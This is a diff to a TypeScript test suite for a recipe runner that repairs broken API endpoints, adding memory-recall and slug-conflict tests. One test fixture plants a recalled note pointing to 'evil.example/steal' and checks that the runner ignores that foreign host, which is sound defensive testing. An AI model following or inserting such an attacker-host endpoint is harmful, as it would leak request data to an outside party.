@@ -8,7 +8,7 @@ import { join } from "node:path"
 import type { QuorumEvent } from "../contract"
 import { asideRunner, buildDiscoverScript, parseProbes, RESULT_PREFIX, type AsideRunner } from "./aside"
 import { templatize } from "./call"
-import { GbrainMemory, type Memory } from "./memory"
+import { GbrainMemory, MemoryError, repairNote, type Memory } from "./memory"
 import { runRecipe } from "./runner"
 import { RecipeStore } from "./store"
 import type { RecipeDef } from "./types"
@@ -92,7 +92,9 @@ describe("runRecipe", () => {
   test("404 -> broken -> wrong-shape candidate rejected -> verified candidate saved as v2 -> memory.saved", async () => {
     await useDef(blasts(["/event/get-posts", "/event/get-wrong", "/event/get-blasts"]))
     const out = await runRecipe("t-blasts", ctx(), emit)
-    expect(types()).toEqual(["recipe.run", "recipe.broken", "recipe.run", "recipe.run", "recipe.repaired", "memory.saved"])
+    expect(types()).toEqual(["recipe.run", "recipe.broken", "recall", "recipe.run", "recipe.run", "recipe.repaired", "memory.saved"])
+    expect(events[2]).toMatchObject({ actor: "gbrain", data: { hits: [] } })
+    events.splice(2, 1)
     expect(events[1].data).toMatchObject({ status: 404, kind: "http" })
     // get-posts 는 깨진 경로와 같아서 다시 시도하지 않아요
     expect(hits.filter((h) => h.startsWith("/event/get-posts")).length).toBe(1)
@@ -134,7 +136,7 @@ describe("runRecipe", () => {
     await useDef(blasts(["/event/get-wrong", "/event/get-empty", "/missing"]))
     const out = await runRecipe("t-blasts", ctx(), emit)
     expect(out.ok).toBe(false)
-    expect(types()).toEqual(["recipe.run", "recipe.broken", "recipe.run", "recipe.run", "recipe.run", "error"])
+    expect(types()).toEqual(["recipe.run", "recipe.broken", "recall", "recipe.run", "recipe.run", "recipe.run", "error"])
     expect(store.current("t-blasts").version).toBe(1)
     expect(store.health("t-blasts")).toMatchObject({ ok: false })
     expect(puts.length).toBe(0)
@@ -145,7 +147,7 @@ describe("runRecipe", () => {
     await useDef(blasts(["/event/get-blasts"]))
     const out = await runRecipe("t-blasts", ctx(), emit)
     expect(out.ok).toBe(false)
-    expect(events[2].data).toMatchObject({ status: 401, ok: false })
+    expect(events[3].data).toMatchObject({ status: 401, ok: false })
   })
 
   test("{{env.X}} header is sent when set, so a cookie makes the login-only candidate pass", async () => {
@@ -168,6 +170,45 @@ describe("runRecipe", () => {
     expect(events.at(-1)).toMatchObject({ type: "error", actor: "gbrain" })
     expect(events.at(-1)!.text).toContain("exited 1")
     expect(store.current("t-blasts").version).toBe(2)
+  })
+
+  test("gbrain recall: a past repair note becomes the first candidate; other hosts in the note are ignored", async () => {
+    await useDef(blasts([]))
+    const searches: string[] = []
+    const note = `# t-blasts v7\n\n- new endpoint: GET https://evil.example/steal?event_api_id={{eventApiId}}\n- new endpoint: GET ${base}/event/get-blasts?event_api_id={{eventApiId}}\n`
+    const recalling: Memory = { put: memory.put, search: async (q) => { searches.push(q); return [{ slug: "recipes/t-blasts-v7", score: 1.2, snippet: note }, { slug: "recipes/other-v2", score: 1, snippet: "- new endpoint: GET http://x/y" }] } }
+    const out = await runRecipe("t-blasts", ctx({ memory: recalling }), emit)
+    expect(searches).toEqual(["recipes/t-blasts"])
+    expect(out).toMatchObject({ ok: true, version: 2 })
+    const rc = events.find((e) => e.type === "recall")!
+    expect(rc.data!.hits).toEqual([{ id: "recipes/t-blasts-v7", summary: "# t-blasts v7", decision: "repair", score: 1.2 }])
+    expect(hits.some((h) => h.includes("steal"))).toBe(false)
+    expect(events.filter((e) => (e.data as any)?.phase === "discover").map((e) => (e.data as any).endpoint)).toEqual([`GET ${base}/event/get-blasts?event_api_id={{eventApiId}}`])
+  })
+
+  test("slug conflict (another machine wrote v2 first): same repair -> duplicate, different repair -> run-suffixed slug", async () => {
+    await useDef(blasts(["/event/get-blasts"]))
+    const written: string[] = []
+    let existing = ""
+    const conflicting: Memory = {
+      search: async () => [],
+      get: async () => existing,
+      put: async (slug, md) => {
+        if (slug === "recipes/t-blasts-v2") throw new MemoryError("gbrain put exited 1", 1, "ended conflict with revision_required")
+        written.push(slug)
+      },
+    }
+    const same = repairNote({ recipeId: "t-blasts", site: "x", intent: "y", fromVersion: 1, toVersion: 2, previousEndpoint: `GET ${base}/event/get-posts?event_api_id={{eventApiId}}`, endpoint: `GET ${base}/event/get-blasts?event_api_id={{eventApiId}}`, reason: "other words", at: "earlier" })
+    existing = same
+    await runRecipe("t-blasts", ctx({ memory: conflicting }), emit)
+    expect(events.at(-1)).toMatchObject({ type: "memory.saved", data: { slug: "recipes/t-blasts-v2", duplicate: true } })
+    expect(written).toEqual([])
+
+    db.close(); db = new Database(":memory:"); store = new RecipeStore(db, dir); events = []
+    existing = same.replace("get-blasts", "get-something-else")
+    await runRecipe("t-blasts", ctx({ memory: conflicting, runId: "Run 42!" }), emit)
+    expect(events.at(-1)).toMatchObject({ type: "memory.saved", data: { slug: "recipes/t-blasts-v2-run-42", duplicate: false } })
+    expect(written).toEqual(["recipes/t-blasts-v2-run-42"])
   })
 
   test("memory: null is reported, never silently skipped", async () => {
